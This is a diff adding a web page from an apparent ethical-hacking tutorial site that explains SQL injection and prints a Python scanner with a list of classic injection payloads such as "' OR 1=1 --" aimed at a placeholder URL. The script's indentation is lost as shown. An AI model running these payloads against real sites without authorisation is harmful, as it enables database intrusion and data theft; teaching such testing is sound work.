@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>SQL Injection Testing</title>
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+</head>
+<body>
+
+  <div class="main-header">
+    <h1>CyberSHESH</h1>
+  </div>
+
+  <div class="main-home">
+    <h1>ETHICAL HACKING | PENETRATION TESTING</h1>
+    <hr />
+    <p>By: Adrian Martin</p>
+  </div>
+
+  <br />
+
+  <div class="main-NDM">
+    <h1>SQL Injection Testing</h1>
+    <button class="back-btn"><a href="../CSh.html">BACK</a></button>
+  </div>
+
+  <div class="discription-NDM">
+    <h2>What is SQL Injection Testing?</h2>
+    <h2>SQL Injection (SQLi) Testing is the process of sending malicious SQL queries to a web application's input fields or URL parameters to check if it improperly interacts with its database. It's one of the most common and dangerous web vulnerabilities.</h2>
+    <br />
+    <h2>Why is SQL Injection Testing Important?</h2>
+    <h2>In ethical hacking and penetration testing, testing for SQL injection helps identify if a website is vulnerable to attacks that could allow hackers to:</h2>
+
+    <ul class="full-list">
+      <li>Bypass login systems</li>
+      <li>View or extract sensitive data from the database</li>
+      <li>Modify or delete database contents</li>
+      <li>Execute administrative database operations</li>
+    </ul>
+
+    <h2>By identifying and patching these vulnerabilities early, organizations can protect their data and users from serious threats.</h2>
+
+    <h2>Python Code: SQL Injection Testing</h2>
+    <div class="box-code">
+<pre><code>
+import requests
+
+# Target URL
+target_url = "http://example.com/page.php?id="
+
+# Common SQL injection payloads
+payloads = [
+"1' OR '1'='1",
+"1' OR '1'='1' --",
+"1' OR 1=1 --",
+"' OR 'a'='a",
+"' OR 1=1#",
+"' OR 'x'='x' --",
+"' OR 'x'='x' /*",
+"' OR 1=1 LIMIT 1 OFFSET 1 --"
+]
+
+print(f"[+] Testing {target_url} for SQL Injection...\n")
+
+for payload in payloads:
+test_url = target_url + payload
+try:
+response = requests.get(test_url, timeout=5)
+print(f"Payload: {payload}")
+print(f"Status Code: {response.status_code}")
+
+if "SQL" in response.text or "syntax" in response.text or "mysql" in response.text.lower():
+print(f"[!] Possible SQL Injection vulnerability detected with payload: {payload}\n")
+else:
+print("[-] No visible SQL error.\n")
+except requests.exceptions.RequestException:
+print(f"[Error] Could not connect to {test_url}\n")
+
+print("[+] Testing complete.")
+</code></pre>
+    </div>
+    <button class="downloadBTN"><a href="../SCRIPT/SQLIT.py">DOWNLOAD CODE</a></button>
+  </div>
+
+  <footer style="background-color: #111; padding: 20px; text-align: center; color: #fff; border-top: 2px solid red;">
+    <h2 style="color: red; margin-bottom: 10px;">For Educational Purpose Only!</h2>
+    <p>This website is built strictly for cybersecurity awareness and ethical hacking education.</p>
+    <p style="color: orange; font-weight: bold;">This page contains security features. Activities are being monitored.</p>
+    <p>Use at your own risk. Unauthorized testing on live systems is illegal.</p>
+    <p><a href="../privacy/privacy.html" style="color: red; text-decoration: underline;">Privacy & Legal Rights</a></p>
+    <br />
+    <p style="color: gray;">© 2025 CyberSHESH | Developed by Adrian Martin</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="../js/pycode.js"></script>
+</body>
+</html>
